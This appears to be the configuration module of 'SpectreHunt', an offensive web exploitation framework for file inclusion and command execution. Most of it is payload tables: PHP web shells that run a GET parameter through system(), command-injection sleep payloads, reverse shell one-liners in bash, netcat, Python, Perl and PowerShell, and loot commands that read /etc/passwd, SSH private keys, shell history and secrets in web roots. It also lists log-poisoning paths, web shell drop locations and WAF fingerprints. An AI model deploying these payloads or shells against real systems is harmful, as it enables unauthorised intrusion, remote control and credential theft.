"""
SpectreHunt :: config.py
Constants, palette, banner, WAF signatures, stack profiles, payload tables.

Author : Inayat Hussain  (Red Team Operator / Offensive Security Researcher)
"""

from __future__ import annotations

import os
import re
import sys

TOOL_NAME = "SpectreHunt"
VERSION = "5.1.0"
TAGLINE = "FILE INCLUSION & COMMAND EXECUTION FRAMEWORK"
SCOPE = "LFI · RFI · RCE · PATH TRAVERSAL · COMMAND INJECTION"
AUTHOR = "Inayat Hussain"
AUTHOR_ROLE = "Red Team Operator | Offensive Security Researcher"

DEFAULT_TIMEOUT = 15
DEFAULT_DEPTH = 5
DEFAULT_MAX_URLS = 250
DEFAULT_THREADS = 16
DEFAULT_CRAWL_THREADS = 8
DEFAULT_MAX_JOBS = 3000
DEFAULT_MAX_BRUTE_PARAMS = 24
DEFAULT_TIMING_DELAY = 4
DEFAULT_RATE_LIMIT = 0.0
DEFAULT_LPORT_RFI = 8899
DEFAULT_SHELL_TIMEOUT = 12
REPORT_DIR = "reports"

VALID_STACKS = ("auto", "php", "aspnet", "java", "node", "python", "generic")
VALID_OS = ("auto", "linux", "windows")
VALID_RENDER = ("off", "auto", "on")

PATH_SEGMENT_EXT = (
    "php", "aspx", "asp", "ashx", "jsp", "do", "action", "html", "htm",
    "json", "xml", "txt", "pdf", "csv", "rss", "atom",
)
PATH_SEGMENT_BLOCKLIST = (
    "index", "home", "about", "contact", "login", "logout", "admin",
    "search", "default", "main", "list", "view", "detail",
)

COMMON_PATHS = (
    "/robots.txt", "/sitemap.xml", "/sitemap_index.xml",
    "/index.php", "/index.aspx", "/default.aspx", "/index.jsp", "/index.html",
    "/admin/", "/administrator/", "/admin.php", "/admin.aspx", "/login",
    "/login.php", "/login.aspx", "/signin", "/dashboard",
    "/api/", "/api/v1/", "/rest/", "/graphql", "/swagger.json",
    "/openapi.json", "/api-docs", "/api/health",
    "/upload", "/upload.php", "/upload.aspx", "/uploads/", "/fileupload",
    "/download", "/download.php", "/download.aspx", "/file/", "/files/",
    "/search", "/search.php", "/search.aspx", "/query", "/find",
    "/page", "/pages/", "/view", "/view.php", "/view.aspx", "/article",
    "/news", "/news.php", "/news.aspx", "/notice", "/notices",
    "/gallery", "/gallery.php", "/photo.php", "/image.php", "/media/",
    "/include/", "/includes/", "/inc/", "/lib/", "/libs/", "/common/",
    "/backup/", "/backups/", "/old/", "/test/", "/tmp/", "/dev/",
    "/phpinfo.php", "/info.php", "/test.php", "/debug.php",
    "/.env", "/.git/config", "/web.config", "/app.config", "/appsettings.json",
    "/server-status", "/actuator/env", "/actuator/health", "/status", "/metrics",
    "/trace.axd", "/elmah.axd", "/wp-json/", "/wp-login.php", "/xmlrpc.php",
    "/cgi-bin/", "/console", "/jmx-console", "/manager/html", "/host-manager/",
)

USER_AGENT = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
)

DEFAULT_HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
}

# --------------------------------------------------------------------------
# Canaries
# --------------------------------------------------------------------------
RCE_MARKER = "SpectreHunt_RCE_Success"
RFI_MARKER = "SpectreHunt_RFI_Marker"
CHAIN_MARKER = "SpectreHunt_CHAIN_OK"
POISON_MARKER = "SpectreHunt_POISON_OK"
WEBSHELL_MARKER = "SpectreHunt_WEBSHELL_OK"
LOOT_START = "__SH_START__"
LOOT_END = "__SH_END__"

RFI_PAYLOAD_FILENAME = "spectrehunt_rfi.txt"
RFI_PAYLOAD_BODY = (
    "<?php echo '" + RFI_MARKER + "'; "
    "if (isset($_GET['c'])) { system($_GET['c']); } ?>"
)

WEBSHELL_FILENAME = "sh.php"
WEBSHELL_BODY = (
    "<?php echo '" + WEBSHELL_MARKER + "'; "
    "if (isset($_GET['c'])) { system($_GET['c']); } ?>"
).encode()

PHP_EXEC = "<?php echo '" + CHAIN_MARKER + "'; system($_GET['c']); ?>"
PHP_POISON = "<?php echo '" + POISON_MARKER + "'; system($_GET['c']); ?>"

MARKERS = {
    "lfi": [
        "root:x:0:0", "daemon:x:", "/bin/bash", "/sbin/nologin",
        "[fonts]", "[extensions]", "boot loader", "for 16-bit app support",
        "php version", "phpinfo()", "document_root", "allow_url_include",
        "<?php", "no such file or directory", "<configuration>",
        "<connectionstrings", "system.web",
    ],
    "traversal": [
        "root:x:0:0", "daemon:x:", "/bin/bash", "/sbin/nologin",
        "[fonts]", "[extensions]", "boot loader", "for 16-bit app support",
    ],
    "rfi": [RFI_MARKER, "<?php", "shell_exec", "system(", "passthru"],
    "rce": [
        RCE_MARKER, "uid=", "gid=", "groups=", "nt authority",
        "volume serial number", "directory of ", "microsoft windows",
    ],
}

SEVERITY = {"rce": "CRITICAL", "rfi": "CRITICAL", "lfi": "HIGH", "traversal": "HIGH"}
SEVERITY_RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

# --------------------------------------------------------------------------
# Stack detection
# --------------------------------------------------------------------------
STACK_HEADER_SIGNATURES = {
    "aspnet": ["asp.net", "aspx", "x-aspnet-version", "microsoft-iis", "aspnetcore", "webforms"],
    "php": ["php", "phpsessid", "laravel", "wordpress", "x-powered-by: php"],
    "java": ["jsessionid", "tomcat", "coyote", "jetty", "struts", "springframework", "servlet"],
    "node": ["express", "connect.sid", "node.js"],
    "python": ["wsgi", "werkzeug", "django", "flask", "gunicorn", "uvicorn", "fastapi"],
}
STACK_BODY_PATTERNS = {
    "aspnet": [r"\.aspx", r"\.ashx", r"aspnet", r"__viewstate", r"webresource\.axd"],
    "php": [r"\.php\b", r"phpsessid", r"wp-content", r"laravel"],
    "java": [r"\.jsp\b", r"\.do\b", r"\.action\b", r"jsessionid", r"struts"],
    "node": [r"express", r"connect\.sid"],
    "python": [r"csrfmiddlewaretoken", r"django", r"werkzeug", r"flask"],
}
STACK_HEADER_WEIGHT = 4
STACK_BODY_WEIGHT = 1
STACK_THRESHOLD = 3

WINDOWS_STACKS = {"aspnet"}
WINDOWS_SERVER_HINTS = ["microsoft-iis", "iis/", "windows"]

CHALLENGE_MARKERS = (
    "just a moment", "cf-challenge", "__cf_chl", "checking your browser",
    "attention required", "enable javascript and cookies",
)
API_HINTS = ("/api/", "/api?", "/graphql", "/rest/", "/v1/", "/v2/", "/v3/",
             "/services/", "/json", ".json", "/rpc")

HIGH_VALUE_PARAMS = (
    "page", "file", "path", "inc", "include", "doc", "document", "folder",
    "root", "pg", "template", "layout", "conf", "lang", "view", "load",
    "dir", "download", "src", "cat", "url", "action", "cmd", "exec",
    "command", "run", "query", "q", "remote", "site", "redirect", "return",
    "target", "type", "id", "p", "f", "nid", "pid", "dept", "content",
)

TIMING_PAYLOADS = {
    "unix": [(";sleep {d}", 4), ("$(sleep {d})", 4), ("|sleep {d}", 4),
             ("&sleep {d}", 4), ("`sleep {d}`", 4)],
    "windows": [("& ping -n {n} 127.0.0.1", 4), ("| ping -n {n} 127.0.0.1", 4),
                ("& timeout /t {d}", 4)],
}

# --------------------------------------------------------------------------
# Shell / post-exploitation
# --------------------------------------------------------------------------
SHELL_PAYLOADS = {
    "unix": [
        "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
        "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "sh -c 'sh -i >& /dev/tcp/{ip}/{port} 0>&1'",
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
        "nc -e /bin/sh {ip} {port}",
        "nc {ip} {port} -e /bin/bash",
        "python3 -c 'import socket,subprocess,os;s=socket.socket();"
        "s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
        "os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl -e 'use Socket;$i=\"{ip}\";$p={port};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");"
        "open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    ],
    "windows": [
        "powershell -c \"$c=New-Object Net.Sockets.TCPClient('{ip}',{port});"
        "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
        "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        "$o=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($o);"
        "$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()\"",
        "nc.exe -e cmd.exe {ip} {port}",
    ],
}

LOOT_COMMANDS = (
    ("id", "whoami /all"),
    ("hostname", "hostname"),
    ("uname -a", "ver"),
    ("cat /etc/passwd", "type C:\\Windows\\win.ini"),
    ("env", "set"),
    ("pwd; ls -la", "cd & dir"),
    ("ls -la /var/www /var/www/html 2>/dev/null | head -30", "dir C:\\inetpub\\wwwroot"),
    ("find / -maxdepth 3 \\( -name '*.conf' -o -name '.env' -o -name 'config.php' \\) "
     "2>/dev/null | head -20", "dir /s /b C:\\*.config 2>nul"),
    ("grep -riE 'pass|secret|key' /var/www 2>/dev/null | head -20",
     "findstr /s /i password C:\\inetpub\\*"),
    ("cat /etc/hosts", "type C:\\Windows\\System32\\drivers\\etc\\hosts"),
    ("tail -20 ~/.bash_history 2>/dev/null", "type %USERPROFILE%\\_history"),
    ("ls -la ~/.ssh 2>/dev/null; head -3 ~/.ssh/id_rsa 2>/dev/null",
     "dir %USERPROFILE%\\.ssh"),
    ("head /proc/net/tcp 2>/dev/null", "netstat -an"),
    ("crontab -l 2>/dev/null; cat /etc/crontab 2>/dev/null", "schtasks /query"),
    ("which wget curl nc python3 perl socat 2>/dev/null", "where wget curl nc powershell"),
)

POISON_LOG_PATHS = (
    "/var/log/apache2/access.log", "/var/log/apache2/error.log",
    "/var/log/httpd/access_log", "/var/log/httpd/error_log",
    "/var/log/nginx/access.log", "/var/log/nginx/error.log",
    "/usr/local/apache/log/access_log", "/usr/local/apache/logs/access_log",
    "/var/log/apache/access.log", "/var/log/lighttpd/access.log",
    "/var/log/auth.log", "/var/log/sshd.log", "/var/log/vsftpd.log",
    "/var/log/mail.log", "/var/log/messages",
    "/proc/self/environ", "/proc/self/fd/0", "/proc/self/fd/1",
    "/proc/self/fd/2", "/proc/self/fd/10",
)
POISON_SESSION_PATHS = (
    "/tmp/sess_{sid}",
    "/var/lib/php/sessions/sess_{sid}",
    "/var/tmp/sess_{sid}",
    "/var/lib/php5/sess_{sid}",
    "/opt/lampp/temp/sess_{sid}",
)

WEBSHELL_REMOTE_DIRS = (
    "/var/www/html", "/var/www", "/var/www/html/public", "/var/www/public",
    "/usr/share/nginx/html", "/var/www/htdocs", ".", "/tmp",
    "C:\\inetpub\\wwwroot",
)
WEBSHELL_WEB_PATHS = (
    "/sh.php", "/public/sh.php", "/html/sh.php", "/web/sh.php", "/tmp/sh.php",
)

# --------------------------------------------------------------------------
# Palette
# --------------------------------------------------------------------------
_NO_COLOR = bool(os.environ.get("NO_COLOR")) or not sys.stdout.isatty()


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[91m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    MAGENTA = "\033[95m"
    CYAN = "\033[96m"
    WHITE = "\033[97m"
    GREY = "\033[90m"
    ACCENT = "\033[38;5;141m"
    ACCENT2 = "\033[38;5;99m"
    DIM = "\033[38;5;240m"


def paint(text, *styles) -> str:
    if _NO_COLOR:
        return str(text)
    return "".join(styles) + str(text) + C.RESET


PREFIX_STYLES = {
    "[*]": (C.DIM,), "[+]": (C.GREEN,), "[!]": (C.YELLOW,), "[!!]": (C.RED, C.BOLD),
    "[LFI]": (C.ACCENT,), "[RFI]": (C.ACCENT,), "[RCE]": (C.RED,),
    "[TRAV]": (C.ACCENT2,), "[SEG]": (C.ACCENT2,), "[JSON]": (C.CYAN,),
    "[CVE]": (C.YELLOW,), "[WAF]": (C.ACCENT2,), "[RENDER]": (C.GREEN,),
    "[DISC]": (C.GREEN,), "[CHAIN]": (C.ACCENT, C.BOLD), "[SHELL]": (C.GREEN, C.BOLD),
    "[LOOT]": (C.CYAN,), "[POISON]": (C.ACCENT,), "[X]": (C.DIM,), "[DIAG]": (C.YELLOW,),
}


def log(prefix: str, message: str = "") -> None:
    print(f"{paint(prefix, *PREFIX_STYLES.get(prefix, (C.WHITE,)))} {message}", flush=True)


ANSI_RE = re.compile(r"\033\[[0-9;]*m")


def strip_ansi(text: str) -> str:
    return ANSI_RE.sub("", text)


BANNER = r"""
   _____ ____  _____ ____ _____ ____  _____ _   _ _   _ _____
  / ____|  _ \| ____/ ___|_   _|  _ \| ____| | | | \ | |_   _|
  \___ \| |_) |  _|| |     | | | |_) |  _| | |_| |  \| | | |
   ___) |  __/| |__| |___  | | |  _ <| |___|  _  | |\  | | |
  |____/|_|   |_____\____| |_| |_| \_\_____|_| |_|_| \_| |_|
"""

BANNER_META = [
    TAGLINE,
    SCOPE,
    "",
    "Author : " + AUTHOR,
    "Role   : " + AUTHOR_ROLE,
    "Build  : v" + VERSION,
]

WAF_SIGNATURES = {
    "Cloudflare": {"headers": {"server": ["cloudflare"], "cf-ray": ["*"], "cf-cache-status": ["*"], "cf-mitigated": ["*"]},
                   "cookies": ["__cfduid", "__cf_bm", "cf_clearance", "__cflb"]},
    "Akamai": {"headers": {"server": ["akamaighost", "akamai"], "x-akamai-transformed": ["*"], "x-akamai-request-id": ["*"]},
               "cookies": ["ak_bmsc", "bm_sv", "akamai_", "bm_sz"]},
    "AWS WAF / CloudFront": {"headers": {"x-amzn-requestid": ["*"], "x-amz-cf-id": ["*"], "x-amz-cf-pop": ["*"], "server": ["awselb", "cloudfront"]},
                             "cookies": ["awsalb", "awsalbcors"]},
    "Imperva / Incapsula": {"headers": {"x-cdn": ["incapsula"], "x-iinfo": ["*"]}, "cookies": ["incap_ses", "visid_incap", "nlbi_"]},
    "Sucuri": {"headers": {"server": ["sucuri"], "x-sucuri-id": ["*"], "x-sucuri-cache": ["*"]}, "cookies": ["sucuri_cloudproxy"]},
    "F5 BIG-IP ASM": {"headers": {"server": ["big-ip", "bigip"], "x-wa-info": ["*"]}, "cookies": ["bigipserver", "ts01", "f5_cspm"]},
    "Barracuda": {"headers": {"server": ["barracuda"], "x-barracuda": ["*"]}, "cookies": ["barra_counter_session"]},
    "ModSecurity": {"headers": {"server": ["mod_security", "modsecurity"], "x-mod-security": ["*"]}, "cookies": []},
    "Wordfence": {"headers": {"x-cache": ["wordfence"]}, "cookies": ["wordfence_verifiedhuman", "wfvt_"]},
    "Fastly": {"headers": {"x-served-by": ["cache-"], "fastly-io-info": ["*"], "x-fastly-request-id": ["*"]}, "cookies": []},
    "Azure Front Door": {"headers": {"x-azure-ref": ["*"], "server": ["azurefd"]}, "cookies": []},
}

CVE_DATABASE = {
    "WordPress": {"*": [("CVE-2023-2982", "MiniOrange Social Login auth bypass", "HIGH")]},
    "Drupal": {"7.": [("CVE-2018-7600", "Drupalgeddon2 -- unauthenticated RCE", "CRITICAL")],
               "8.": [("CVE-2018-7600", "Drupalgeddon2 -- unauthenticated RCE", "CRITICAL")]},
    "Joomla": {"3.7": [("CVE-2017-8917", "com_fields SQL injection", "HIGH")],
               "*": [("CVE-2015-8562", "HTTP header RCE (3.4.x)", "CRITICAL")]},
    "Apache": {"2.4.49": [("CVE-2021-41773", "Path traversal / RCE", "CRITICAL")],
               "2.4.50": [("CVE-2021-42013", "Path traversal / RCE (bypass)", "CRITICAL")]},
    "Nginx": {"1.2": [("CVE-2019-20372", "Off-by-slash alias traversal", "MEDIUM")]},
    "Tomcat": {"8.": [("CVE-2020-1938", "Ghostcat -- AJP file read / RCE", "HIGH")],
               "9.": [("CVE-2020-1938", "Ghostcat -- AJP file read / RCE", "HIGH")]},
    "Jenkins": {"*": [("CVE-2019-1003000", "Sandbox bypass to RCE", "HIGH")]},
    "PHP": {"5.": [("CVE-2019-11043", "PHP-FPM underflow RCE", "CRITICAL")]},
    "IIS": {"7.": [("CVE-2015-1635", "MS15-034 HTTP.sys RCE", "CRITICAL")]},
    "ASP.NET": {"*": [("CVE-2023-36560", "ViewState / path traversal family", "HIGH")]},
}


def _vtuple(value: str) -> tuple:
    parts = re.findall(r"\d+", value or "")
    return tuple(int(p) for p in parts[:4])


def match_version(detected, spec: str) -> bool:
    if spec == "*":
        return True
    if not detected:
        return False
    detected_t = _vtuple(detected)
    if not detected_t:
        return False
    if "-" in spec:
        lo, _, hi = spec.partition("-")
        return _vtuple(lo) <= detected_t <= _vtuple(hi)
    spec_t = _vtuple(spec)
    return bool(spec_t) and detected_t[: len(spec_t)] == spec_t


def lookup_cves(product, version) -> list:
    if not product:
        return []
    table = CVE_DATABASE.get(product)
    if not table:
        return []
    out = []
    for spec, entries in table.items():
        if match_version(version, spec):
            for item in entries:
                if item not in out:
                    out.append(item)
    return out
